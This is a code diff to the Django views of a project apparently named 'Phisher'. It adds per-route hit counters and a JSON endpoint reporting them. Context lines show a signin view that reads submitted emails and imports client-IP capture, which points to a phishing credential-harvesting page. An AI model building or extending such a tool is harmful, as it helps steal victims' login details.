@@ -1,14 +1,27 @@
-from Phisher.models import SignIn
+from django.http import JsonResponse
 from django.shortcuts import render, HttpResponsePermanentRedirect
 from datetime import datetime
-from .utils import get_client_ip
+
+from .models import SignIn
+from .utils import get_client_ip, increment_hit_count
+
+
+hits:dict = {
+    '/':0,
+    '/signin':0,
+    '/error':0,
+    '/get-hits':0,
+}
 
 
 def index(request):
+    hits['/'] += 1
     return render(request, 'index.html')
 
 
 def signin(request):
+    hits['/signin'] += 1
+
     try:
         if request.method == 'POST':
             email = request.POST.get('email', None)
@@ -30,4 +43,10 @@ def signin(request):
 
 
 def error(request):
+    hits['/error'] += 1
     return render(request, '400.html')
+
+def get_hit_counts(request):
+    hits['/get-hits'] += 1
+
+    return JsonResponse({"hits":hits})
